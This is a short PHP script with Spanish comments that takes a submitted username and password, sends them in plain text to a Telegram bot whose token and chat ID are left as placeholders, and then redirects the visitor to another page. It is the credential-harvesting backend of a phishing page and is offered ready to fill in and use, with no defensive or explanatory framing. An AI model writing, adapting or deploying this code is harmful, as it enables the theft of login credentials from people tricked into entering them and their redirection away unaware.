<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recupera los datos del formulario
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Envía los datos al bot de Telegram
    $telegramBotToken = "TU_TOKEN_DE_TELEGRAM_BOT";
    $chatId = "TU_CHAT_ID"; // Puedes obtenerlo de tu bot de Telegram

    $message = "Usuario: $username\nContraseña: $password";
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    $response = file_get_contents($telegramApiUrl);

    // Redirige al usuario a otro sitio después de enviar el mensaje
    header("Location: index2.html"); // Cambia la URL de redirección según tus necesidades
    exit();
}
?>
